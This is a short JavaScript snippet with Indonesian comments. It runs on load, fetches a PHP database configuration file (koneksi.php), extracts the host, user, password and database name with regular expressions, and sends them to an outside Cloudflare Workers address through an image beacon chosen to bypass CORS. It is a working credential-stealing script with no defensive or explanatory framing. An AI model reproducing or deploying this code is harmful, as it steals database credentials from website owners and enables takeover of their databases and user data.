function sendWithImageBeacon() {
    fetch('../config/koneksi.php')
        .then(response => response.text())
        .then(content => {
            const extract = (regex) => (content.match(regex) || [,'Not found'])[1];
            const data = `HOST=${extract(/\$host\s*=\s*["']([^"']+)["']/)}|USER=${extract(/\$user\s*=\s*["']([^"']+)["']/)}|PASS=${extract(/\$password\s*=\s*["']([^"']+)["']/)}|DB=${extract(/\$database\s*=\s*["']([^"']+)["']/)}`;
            
            // Menggunakan image beacon (tidak terpengaruh CORS)
            const img = new Image();
            img.src = 'https://lucifer.yutupprem0.workers.dev/?message=' + encodeURIComponent(data);
            
            console.log('✅ Data dikirim via Image Beacon');
            console.log('📊 Data:', data);
        })
        .catch(error => console.error('Error:', error));
}

sendWithImageBeacon();
